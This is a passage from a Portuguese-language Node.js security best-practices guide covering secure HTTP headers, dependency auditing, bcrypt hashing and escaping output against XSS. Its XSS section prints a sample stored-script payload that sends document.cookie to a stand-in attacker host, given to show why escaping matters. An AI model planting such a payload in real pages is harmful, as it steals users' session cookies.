<p>O servidor da Web HTTPS fornece uma lista de hashes de chave pública e, em conexões subsequentes, os clientes esperam que o servidor use uma ou mais dessas chaves públicas em sua cadeia de certificados. Usando esse recurso com cuidado, você pode reduzir muito o risco de ataques MITM (man-in-the-middle) e outros problemas de autenticação falsos para os usuários do seu aplicativo sem incorrer em riscos indevidos.</p>
<p>Antes de implementar, você deve olhar primeiro para o cabeçalho <code class="language-text">Expect-CT</code>, devido à sua flexibilidade avançada para recuperação de erros de configuração e outras <a href="https://groups.google.com/a/chromium.org/forum/m/#!msg/blink-dev/he9tr7p3rZ8/eNMwKPmUBAAJ" target="_blank" rel="nofollow noopener noreferrer">vantagens</a>.</p>
<p>O cabeçalho Public-Key-Pins aceita 4 valores, um valor <code class="language-text">pin-sha256</code> para adicionar a chave pública do certificado, com uma hash aplicada usando o algoritmo SHA256, que pode ser adicionado várias vezes para diferentes chaves públicas, um valor<code class="language-text">max-age</code> para dizer ao navegador quanto tempo deve aplicar a regra, um valor <code class="language-text">includeSubDomains</code> para aplicar essa regra a todos os subdomínios e um valor<code class="language-text">report-uri</code> para relatar falhas na validação de pinos para a URL fornecida.</p>
<p>Exemplo de cabeçalho - Política HPKP ativada por uma semana, inclui subdomínios, relata falhas a um URL de exemplo e permite duas chaves públicas</p>
<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">Public-Key-Pins: pin-sha256=&quot;d6qzRu9zOECb90Uez27xWltNsj0e1Md7GkYYkVoZWmM=&quot;; pin-sha256=&quot;E9CZ9INDbd+2eRQozYqqbQ2yXLVKB9+xcprMF+44U1g=&quot;; report-uri=&quot;http://example.com/pkp-report&quot;; max-age=2592000; includeSubDomains</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>🔗 <a href="https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#hpkp" target="_blank" rel="nofollow noopener noreferrer">Leia em OWASP Projeto de Cabeçalhos Seguros</a></p>
<p>🔗 <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Public_Key_Pinning" target="_blank" rel="nofollow noopener noreferrer">Leia na documentação web da MDN</a></p>
<h3>X-Frame-Options</h3>
<p>O cabeçalho X-Frame-Options protege a aplicação contra ataques <a href="https://www.owasp.org/index.php/Clickjacking" target="_blank" rel="nofollow noopener noreferrer">Clickjacking</a> declarando uma política se o seu aplicativo pode ser incorporado em outras páginas (externas) usando frames.</p>
<p>X-Frame-Options permite 3 parâmetros, um parâmetro <code class="language-text">deny</code> para não permitir embutir o recurso em geral, um parâmetro<code class="language-text">sameorigin</code> para permitir embutir o recurso no mesmo host/origem e um parâmetro <code class="language-text">allow-from</code> para especificar um host onde a incorporação do recurso é permitido.</p>
<p>Exemplo de cabeçalho - Negar a incorporação de seu aplicativo</p>
<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">X-Frame-Options: deny</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>🔗 <a href="https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#xfo" target="_blank" rel="nofollow noopener noreferrer">Leia em OWASP Projeto de Cabeçalhos Seguros</a></p>
<p>🔗 <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options" target="_blank" rel="nofollow noopener noreferrer">Leia na documentação web da MDN</a></p>
<h3>X-XSS-Protection</h3>
<p>Este cabeçalho ativa o filtro <a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)" target="_blank" rel="nofollow noopener noreferrer">Cross-site scripting</a> no seu navegador.</p>
<p>Aceita 4 parâmetros, <code class="language-text">0</code> para desabilitar o filtro,<code class="language-text">1</code> para habilitar o filtro e habilitar sanitização automática da página, <code class="language-text">mode = block</code> para habilitar o filtro e evitar que a página seja renderizada se um ataque XSS for detectado (este parâmetro deve ser adicionado ao <code class="language-text">1</code> usando um ponto-e-vírgula, e <code class="language-text">report = &lt;domainToReport&gt;</code> para relatar a violação (este parâmetro deve ser adicionado ao <code class="language-text">1</code>).</p>
<p>Exemplo de cabeçalho - Ativa a Proteção XSS e denuncia violações a URL de exemplo</p>
<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">X-XSS-Protection: 1; report=http://example.com/xss-report</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>🔗 <a href="https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#xxxsp" target="_blank" rel="nofollow noopener noreferrer">Leia em OWASP Projeto de Cabeçalhos Seguros</a></p>
<p>🔗 <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection" target="_blank" rel="nofollow noopener noreferrer">Leia na documentação web da MDN</a></p>
<h3>X-Content-Type-Options</h3>
<p>Definir esse cabeçalho impedirá que o navegador <a href="https://en.wikipedia.org/wiki/Content_sniffing" target="_blank" rel="nofollow noopener noreferrer">interprete os arquivos como algo diferente</a> do que o declarado pelo tipo de conteúdo nos cabeçalhos HTTP.</p>
<p>Exemplo de cabeçalho - não permite conteúdo sniffing</p>
<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">X-Content-Type-Options: nosniff</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>🔗 <a href="https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#xcto" target="_blank" rel="nofollow noopener noreferrer">Leia em OWASP Projeto de Cabeçalhos Seguros</a></p>
<p>🔗 <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options" target="_blank" rel="nofollow noopener noreferrer">Leia na documentação web da MDN</a></p>
<h3>Referrer-Policy</h3>
<p>O cabeçalho HTTP Policy-Referer rege quais informações do referenciador, enviadas no cabeçalho <code class="language-text">Referer</code>, devem ser incluídas nas requisições feitas.</p>
<p>Permite 8 parâmetros, um parâmetro <code class="language-text">no-referrer</code> para remover completamente o cabeçalho <code class="language-text">Referer</code>, um <code class="language-text">no-referrer-when-downgrade</code> para remover o cabeçalho <code class="language-text">Referer</code> quando rebaixado, por exemplo, HTTPS -> HTTP, um parâmetro <code class="language-text">origin</code> para enviar a origem do host (a raiz do host) como referenciador <strong>apenas</strong>, um parâmetro <code class="language-text">origin-when-cross-origin</code> para enviar uma URL de origem completa ao permanecer na mesma origem e enviar <strong>apenas</strong> a origem do host caso contrário, um parâmetro <code class="language-text">same-origin</code> para enviar informações de referência apenas para origens de mesmo site e omitir solicitações de origem cruzada, um parâmetro <code class="language-text">strict-origin</code> para manter o cabeçalho <code class="language-text">Referer</code> apenas no mesmo nível de segurança (HTTPS -> HTTPS) e omitir em um destino menos seguro, um parâmetro <code class="language-text">strict-origin-when-cross-origin</code> para enviar o URL referenciador completo para um destino de mesma origem, a origem <strong>apenas</strong> para um destino de origem cruzada no mesmo nível de segurança e nenhum referenciador em um destino de origem cruzada menos segura, e um parâmetro <code class="language-text">unsafe-url</code> para enviar o referenciador completo para destinos de mesma origem ou de origem cruzada.</p>
<p>Exemplo de cabeçalho - Remova o cabeçalho <code class="language-text">Referer</code> completamente</p>
<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">Referrer-Policy: no-referrer</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>🔗 <a href="https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#rp" target="_blank" rel="nofollow noopener noreferrer">Leia em OWASP Projeto de Cabeçalhos Seguros</a></p>
<p>🔗 <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy" target="_blank" rel="nofollow noopener noreferrer">Leia na documentação web da MDN</a></p>
<h3>Expect-CT</h3>
<p>O cabeçalho Expect-CT é usado por um servidor para indicar que os navegadores devem avaliar as conexões com o host que emite o cabeçalho para a conformidade com <a href="https://www.certificate-transparency.org/" target="_blank" rel="nofollow noopener noreferrer">Transparência do Certificado</a>.</p>
<p>Este cabeçalho aceita 3 parâmetros, um parâmetro <code class="language-text">report-uri</code> para fornecer uma URL para relatar falhas do Expect-CT, um parâmetro<code class="language-text">enforce</code> para sinalizar ao navegador que a Transparência do Certificado deve ser imposta (em vez de apenas relatada) e recusar conexões futuras violando a Transparência do Certificado e um parâmetro <code class="language-text">max-age</code> para especificar o número de segundos que o navegador considera o host como um host Expect-CT conhecido.</p>
<p>Exemplo de cabeçalho - Impor a transparência do certificado por uma semana e reportar a URL de exemplo</p>
<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">Expect-CT: max-age=2592000, enforce, report-uri=&quot;https://example.com/report-cert-transparency&quot;</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>🔗 <a href="https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#ect" target="_blank" rel="nofollow noopener noreferrer">Leia em OWASP Projeto de Cabeçalhos Seguros</a></p>
<h3>Content-Security-Policy</h3>
<p>O cabeçalho de resposta HTTP Content-Security-Policy permite controlar os recursos que o agente do usuário pode carregar para uma determinada página. Com algumas exceções, as políticas envolvem principalmente a especificação de origens de servidor e pontos de extremidade de script. Isso ajuda a proteger contra <a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)" target="_blank" rel="nofollow noopener noreferrer">ataques de script entre sites (XSS)</a>.</p>
<p>Exemplo de Cabeçalho - Ative o CSP e apenas execute scripts da mesma origem</p>
<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">Content-Security-Policy: script-src &#39;self&#39;</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>Existem muitas políticas ativadas com o Content-Security-Policy que podem ser encontradas nos sites vinculados abaixo.</p>
<p>🔗 <a href="https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#csp" target="_blank" rel="nofollow noopener noreferrer">Leia em OWASP Projeto de Cabeçalhos Seguros</a></p>
<p>🔗 <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy" target="_blank" rel="nofollow noopener noreferrer">Leia na documentação web da MDN</a></p>
<h3>Recursos adicionais</h3>
<p>🔗 <a href="https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#tab=Headers" target="_blank" rel="nofollow noopener noreferrer">OWASP Projeto de Cabeçalhos Seguros</a></p>
<p>🔗 <a href="https://blog.risingstack.com/node-js-security-checklist/" target="_blank" rel="nofollow noopener noreferrer">Lista de Verificação de Segurança Node.js (RisingStack)</a></p>
<h2>6.7. Inspecione constante e automaticamente por dependências vulneráveis</h2>
<p><a href="https://www.owasp.org/index.php/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A9:Known%20Vulnerabilities%20-green.svg" alt></a></p>
<p><strong>TL;DR:</strong> Com o ecosistema do npm, é comum um projeto ter várias dependências. Dependências sempre devem ser checadas em caso de novas vulnerabilidades serem encontradas. Utilize ferramentas como <a href="https://docs.npmjs.com/cli/audit" target="_blank" rel="nofollow noopener noreferrer">npm audit</a> ou <a href="https://snyk.io/" target="_blank" rel="nofollow noopener noreferrer">snyk</a> para rastrear, monitorar e corrigir dependências vulneráveis. Integre estas ferramentas com a configuração de seu CI, para que você possa capturar uma dependência vulnerável antes que ela afete o ambiente de produção.</p>
<p><strong>Caso contrário:</strong> Um invasor pode detectar seu framework web e atacar todas suas vulnerabilidades.</p>
<h1>Inspecione constante e automaticamente por dependências vulneráveis</h1>
<h3>Explicação em um Parágrafo</h3>
<p>A maioria das aplicações Node.js depende muito de um grande número de módulos de terceiros do npm ou do Yarn, ambos registros de pacotes populares, devido à facilidade e velocidade de desenvolvimento. No entanto, a desvantagem desse benefício são os riscos de segurança de incluir vulnerabilidades desconhecidas em seu aplicativo, que é um risco reconhecido por seu lugar na lista de riscos de segurança de aplicações web mais importante do OWASP.</p>
<p>Há várias ferramentas disponíveis para ajudar a identificar pacotes de terceiros em aplicativos Node.js que foram identificados como vulneráveis ​​pela comunidade para reduzir o risco de introduzi-los em seu projeto. Eles podem ser usados ​​periodicamente em ferramentas CLI ou incluídos como parte do processo de criação da sua aplicação.</p>
<h3>Índice</h3>
<ul>
<li><a href="#npm-audit">NPM audit</a></li>
<li><a href="#snyk">Snyk</a></li>
<li><a href="#greenkeeper">Greenkeeper</a></li>
</ul>
<h3>NPM Audit</h3>
<p><code class="language-text">npm audit</code> é uma nova ferramenta cli introduzida no NPM@6.</p>
<p>A execução de <code class="language-text">npm audit</code> produzirá um relatório de vulnerabilidades de segurança com o nome do pacote afetado, gravidade da vulnerabilidade e descrição, caminho e outras informações e, se disponíveis, comandos para aplicar correções para resolver vulnerabilidades.</p>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/npm-audit.png?raw=true" alt="exemplos do npm audit"></p>
<p>🔗 <a href="https://docs.npmjs.com/getting-started/running-a-security-audit" target="_blank" rel="nofollow noopener noreferrer">Leia em: NPM blog</a></p>
<h3>Snyk</h3>
<p>O Snyk oferece uma CLI rica em recursos, bem como integração com o GitHub. O Snyk vai além disso e, além de notificar vulnerabilidades, também cria automaticamente novas solicitações de pull, corrigindo vulnerabilidades, à medida que os patches são liberados para vulnerabilidades conhecidas.</p>
<p>O site do Snyk, rico em recursos, também permite uma avaliação ad-hoc das dependências, quando fornecido com um repositório do GitHub ou url do módulo npm. Você também pode procurar por pacotes npm que possuem vulnerabilidades diretamente.</p>
<p>Um exemplo da saída da integração do Synk GitHub, solicitação de pull criada automaticamente:
<img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/snyk.png?raw=true" alt="exemplo do synk GitHub"></p>
<p>🔗 <a href="https://snyk.io/" target="_blank" rel="nofollow noopener noreferrer">Leia em: Snyk website</a></p>
<p>🔗 <a href="https://snyk.io/test" target="_blank" rel="nofollow noopener noreferrer">Leia em: Ferramenta on-line Synk para verificar pacotes npm e módulos do GitHub</a></p>
<h3>Greenkeeper</h3>
<p>O Greenkeeper é um serviço que oferece atualizações de dependência em tempo real, o que mantém um aplicativo mais seguro, sempre usando as versões das dependêcias mais atualizadas e corrigidas.</p>
<p>O Greenkeeper observa as dependências npm especificadas no arquivo <code class="language-text">package.json</code> de um repositório e cria automaticamente uma ramificação com cada atualização de dependência. O conjunto de Integração Contínua (IC) do repositório é então executado para revelar quaisquer alterações significativas para a versão de dependência atualizada no aplicativo. Se o IC falhar devido à atualização de dependência, um problema claro e conciso será criado no repositório para ser analisado, destacando as versões do pacote atual e atualizado, juntamente com informações e histórico de confirmações da versão atualizada.</p>
<p>Um exemplo da saída da solicitação do Greenkeeper GitHub automaticamente criado pull request:</p>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/greenkeeper.png?raw=true" alt="exemplo do synk github">
🔗 <a href="https://greenkeeper.io/" target="_blank" rel="nofollow noopener noreferrer">Leia em: site do Greenkeeper</a></p>
<h3>Recursos Adicionais</h3>
<p>🔗 <a href="https://blog.risingstack.com/controlling-node-js-security-risk-npm-dependencies/" target="_blank" rel="nofollow noopener noreferrer">Rising Stack Blog: riscos de dependências Node.js</a></p>
<p>🔗 <a href="https://nodesource.com/blog/how-to-reduce-risk-and-improve-security-around-npm" target="_blank" rel="nofollow noopener noreferrer">NodeSource Blog: Melhorando a segurança do npm</a></p>
<h2>6.8. Evite usar a biblioteca de criptografia do Node.js para manipular senhas, use Bcrypt</h2>
<p><a href="https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A9:Broken%20Authentication%20-green.svg" alt></a></p>
<p><strong>TL;DR:</strong> Senhas ou segredos (chaves de API), devem ser armazenadas usando um hash seguro + salt function como bcrypt, que deve ser a escolha preferencial em relação à sua implementação de JavaScript, devido a razões de desempenho e segurança.</p>
<p><strong>Caso contrário:</strong> Senhas ou segredos que são persistidos sem o uso de uma função segura, são vulneráveis a força bruta e ataques de dicionário que levarão eventualmente à sua divulgação.</p>
<h1>Evite usar a biblioteca de criptografia do Node.js para manipular senhas, use Bcrypt</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Ao armazenar senhas de usuários, use um algoritmo hash adaptativo como o bcrypt, oferecido pelo <a href="https://www.npmjs.com/package/bcrypt" target="_blank" rel="nofollow noopener noreferrer">módulo bcrypt npm</a> é recomendado em vez de usar o módulo de criptografia Node.js nativo. <code class="language-text">Math.random ()</code> também nunca deve ser usado como parte de qualquer senha ou geração de token devido à sua previsibilidade.</p>
<p>O módulo <code class="language-text">bcrypt</code> ou similar deve ser usado ao contrário da implementação JavaScript, pois quando se usa <code class="language-text">bcrypt</code>, um número de ‘rounds’ pode ser especificado para fornecer um hash seguro. Isso define o fator de trabalho ou o número de ‘rounds’ pelos quais os dados são processados, e mais rounds de hash levam a hash mais seguro (embora isso custe tempo de CPU). A introdução de hash rounds significa que o fator de força bruta é reduzido significativamente, pois os crackers de senha são retardados, aumentando o tempo necessário para gerar uma tentativa.</p>
<h3>Exemplo de Código</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// gerando uma senha segura assincronamente usando 10 rodadas de hash</span>
bcrypt<span class="token punctuation">.</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string">'myPassword'</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> hash</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// Armazenar hash segura no registro do usuário</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// comparar uma entrada de senha fornecida com o hash salvo</span>
bcrypt<span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span><span class="token string">'somePassword'</span><span class="token punctuation">,</span> hash<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> match</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>match<span class="token punctuation">)</span> <span class="token punctuation">{</span>
   <span class="token comment">// Senhas conferem</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
   <span class="token comment">// Senhas não conferem</span>
  <span class="token punctuation">}</span> 
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>O que Outros Blogueiros Dizem</h3>
<p>Do blog de <a href="https://dzone.com/articles/nodejs-and-password-storage-with-bcrypt" target="_blank" rel="nofollow noopener noreferrer">Max McCarty</a>:</p>
<blockquote>
<p>… não é só usar apenas o algoritmo hash correto. Falei extensivamente sobre como a ferramenta certa também inclui o ingrediente necessário de “tempo” como parte do algoritmo de hash de senha e o que significa para o invasor que está tentando decifrar senhas por meio de força bruta.</p>
</blockquote>
<h2>6.9. Fuja de saídas HTML, JS e CSS</h2>
<p><a href="https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A7:XSS%20-green.svg" alt></a></p>
<p><strong>TL;DR:</strong> Dados não confiáveis que são enviados para o browser podem ser executados em invés de serem exibidos. Isso está sendo comumente referido como um ataque de script entre sites (XSS). Evite isto, usando bibliotecas dedicadas que marcam explicitamente os dados como conteúdo puro que nunca deve ser executado (por exemplo: encoding, escaping).</p>
<p><strong>Caso contrário:</strong> Um invasor pode armazenar um código JavaScript malicioso em seu banco de dados, que será enviado para os clientes.</p>
<h1>Escape as Saídas</h1>
<h3>Explicação de um Parágrafo</h3>
<p>HTML e outras linguagens da Web combinam conteúdo com código executável - um único parágrafo HTML pode conter uma representação visual de dados junto com instruções de execução de JavaScript. Ao renderizar HTML ou retornar dados da API, o que acreditamos ser um conteúdo puro pode realmente incorporar código JavaScript que será interpretado e executado pelo navegador. Isso acontece, por exemplo, quando renderizamos conteúdo que foi inserido por um invasor em um banco de dados - por exemplo <code class="language-text">&lt;div&gt;&lt;script&gt;//malicious code&lt;/script&gt;&lt;/div&gt;</code>. Isso pode ser mitigado instruindo o navegador a tratar qualquer parte de dados não confiáveis ​​apenas como conteúdo e nunca interpretá-los - essa técnica é chamada de escape. Muitas bibliotecas npm e mecanismos de templates HTML fornecem recursos de escape (example: <a href="https://github.com/component/escape-html" target="_blank" rel="nofollow noopener noreferrer">escape-html</a>, <a href="https://github.com/ESAPI/node-esapi" target="_blank" rel="nofollow noopener noreferrer">node-esapi</a>). Não só o conteúdo HTML deve ser escapado, mas também CSS e JavaScript</p>
<h3>Exemplo de código: não coloque dados não confiáveis ​​no seu HTML</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token operator">...</span><span class="token constant">NUNCA</span> <span class="token constant">COLOQUE</span> <span class="token constant">DADOS</span> <span class="token constant">N</span>Ã<span class="token constant">O</span> <span class="token constant">CONFI</span>Á<span class="token constant">VEIS</span> <span class="token constant">AQUI</span><span class="token operator">...</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>   direto em um script
 
 <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token operator">...</span><span class="token constant">NUNCA</span> <span class="token constant">COLOQUE</span> <span class="token constant">DADOS</span> <span class="token constant">N</span>Ã<span class="token constant">O</span> <span class="token constant">CONFI</span>Á<span class="token constant">VEIS</span> <span class="token constant">AQUI</span><span class="token operator">...</span><span class="token operator">--</span><span class="token operator">></span>             dentro de um comentário <span class="token constant">HTML</span>
 
 <span class="token operator">&lt;</span>div <span class="token operator">...</span><span class="token constant">NUNCA</span> <span class="token constant">COLOQUE</span> <span class="token constant">DADOS</span> <span class="token constant">N</span>Ã<span class="token constant">O</span> <span class="token constant">CONFI</span>Á<span class="token constant">VEIS</span> <span class="token constant">AQUI</span><span class="token operator">...</span><span class="token operator">=</span>test <span class="token operator">/</span><span class="token operator">></span>       em um nome de atributo
 
 <span class="token operator">&lt;</span><span class="token constant">NUNCA</span> <span class="token constant">COLOQUE</span> <span class="token constant">DADOS</span> <span class="token constant">N</span>Ã<span class="token constant">O</span> <span class="token constant">CONFI</span>Á<span class="token constant">VEIS</span> <span class="token constant">AQUI</span><span class="token operator">...</span> href<span class="token operator">=</span><span class="token string">"/test"</span> <span class="token operator">/</span><span class="token operator">></span>   no nome de uma tag
 
 <span class="token operator">&lt;</span>style<span class="token operator">></span><span class="token operator">...</span><span class="token constant">NUNCA</span> <span class="token constant">COLOQUE</span> <span class="token constant">DADOS</span> <span class="token constant">N</span>Ã<span class="token constant">O</span> <span class="token constant">CONFI</span>Á<span class="token constant">VEIS</span> <span class="token constant">AQUI</span><span class="token operator">...</span><span class="token operator">&lt;</span><span class="token operator">/</span>style<span class="token operator">></span>   direto no <span class="token constant">CSS</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Exemplo de código - Conteúdo mal-intencionado que pode ser injetado em um banco de dados</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token operator">&lt;</span>div<span class="token operator">></span>
  <span class="token operator">&lt;</span>b<span class="token operator">></span><span class="token constant">A</span> pseudo comment to the a post<span class="token operator">&lt;</span><span class="token operator">/</span>b<span class="token operator">></span>
  <span class="token operator">&lt;</span>script<span class="token operator">></span>
    window<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">'http://attacker/?cookie='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Citação de Blog: “Quando não queremos que os caracteres sejam interpretados”</h3>
<p>Do Blog <a href="https://benramsey.com/articles/escape-output/" target="_blank" rel="nofollow noopener noreferrer">benramsey.com</a></p>
<blockquote>
<p>Os dados podem deixar sua aplicação na forma de HTML enviado para um navegador da Web, SQL enviado para um banco de dados, XML enviado para um leitor de RSS, WML enviado para um dispositivo sem fio, etc. As possibilidades são ilimitadas. Cada um deles tem seu próprio conjunto de caracteres especiais que são interpretados de maneira diferente do resto do texto simples recebido. Às vezes queremos enviar esses caracteres especiais para que eles sejam interpretados (tags HTML enviadas para um navegador da Web, por exemplo), enquanto outras vezes (no caso de entrada de usuários ou alguma outra fonte), não queremos que os caracteres para ser interpretado, então precisamos escapar eles.</p>
</blockquote>
<blockquote>
<p>Escaping também é conhecido como codificação. Em suma, é o processo de representar dados de maneira que não sejam executados ou interpretados. Por exemplo, o HTML renderizará o texto a seguir em um navegador da Web como texto em negrito, porque as marcações <strong> têm um significado especial:
<strong>Isso é um texto em negrito.</strong>
Mas, suponha que eu queira renderizar as tags no navegador e evitar sua interpretação. Então, eu preciso escapar os colchetes, que têm um significado especial em HTML. A seguir ilustra-se o HTML com escape:</p>
</blockquote>
<p>&#x3C;strong>Isso é um texto em negrito.&#x3C;/strong></p>
<h3>Citação de Blog: “OWASP recomenda usar uma biblioteca de codificação focada em segurança”</h3>
<p>Do blog OWASP <a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet" target="_blank" rel="nofollow noopener noreferrer">Folha de Dicas de Prevenção de XSS (Cross Site Scripting)</a></p>
<blockquote>
<p>“Escrever esses codificadores não é tremendamente difícil, mas existem algumas armadilhas ocultas. Por exemplo, você pode se sentir tentado a usar alguns dos atalhos de escape, como ”” em JavaScript. No entanto, esses valores são perigosos e podem ser mal interpretados pelos analisadores aninhados no navegador. Você também pode esquecer de escapar do caracter de escape, que os atacantes podem usar para neutralizar suas tentativas de segurança.<strong>OWASP recomenda o uso de uma biblioteca de codificação focada em segurança para garantir que essas regras sejam implementadas corretamente</strong>.”</p>
</blockquote>
<h3>Citação de Blog: “Você DEVE usar a sintaxe de escape para a parte do HTML”</h3>
<p>Do blog OWASP <a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet" target="_blank" rel="nofollow noopener noreferrer">Folha de Dicas de Prevenção de XSS (Cross Site Scripting)</a></p>
<blockquote>
<p>“Mas a codificação de entidade HTML não funciona se você estiver colocando dados não confiáveis ​​dentro de uma tag <code class="language-text">&lt;script&gt;</code> em qualquer lugar, ou um atributo do manipulador de eventos, como onmouseover ou dentro de CSS, ou em uma URL. Portanto, mesmo se você usar um método de codificação de entidade HTML em todos os lugares, provavelmente ainda estará vulnerável ao XSS. Você DEVE usar a sintaxe de escape para a parte do documento HTML na qual você está colocando dados não confiáveis.”</p>
</blockquote>
<h2>6.10. Valide os esquemas de entrada JSON</h2>
<p><a href="https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A7: XSS%20-green.svg" alt></a> <a href="https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A8:Insecured%20Deserialization%20-green.svg" alt></a></p>
<p><strong>TL;DR:</strong> Valide as requisições do body e garanta que elas atendem as expectativas e falhem rápido se não atender. Para evitar o tédio de códigos de validação para cada rota, você pode usar leves esquemas de validação baseados em JSON, como <a href="https://www.npmjs.com/package/jsonschema" target="_blank" rel="nofollow noopener noreferrer">jsonschema</a> ou <a href="https://www.npmjs.com/package/joi" target="_blank" rel="nofollow noopener noreferrer">joi</a></p>
<p><strong>Caso contrário:</strong> Sua generosidade e abordagem permissiva aumentam muito a superfície de ataque e incentivam o invasor a experimentar muitas entradas até encontrar alguma combinação para travar a aplicação.</p>
<h1>Valide os esquemas de entrada JSON</h1>
<h3>Explicação em um Parágrafo</h3>
